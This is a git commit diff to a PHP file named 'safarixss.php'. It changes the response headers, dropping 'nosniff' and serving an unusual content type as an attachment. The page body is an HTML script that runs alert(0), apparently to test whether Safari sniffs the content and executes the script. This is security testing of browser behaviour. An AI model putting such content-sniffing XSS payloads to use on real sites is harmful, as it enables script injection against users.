5b627588b4c814c3c60e6e3a66b5789af3d7399c
missoum1307 <missoum1307@users.noreply.github.com>
2018-03-03 01:21:33 +0100

    Update safarixss.php

--- safarixss.php
+++ safarixss.php
@@ -1,6 +1,6 @@
 <?php 
-header('Content-Type: application/x-octet-stream');
-header('X-Content-Type-Options: nosniff');
+header('Content-Type: application/x-protobuffer');
+header('Content-Disposition: attachment; filename="f.txt"');
 ?>
 
 aa<html><script>alert(0)</script></html>
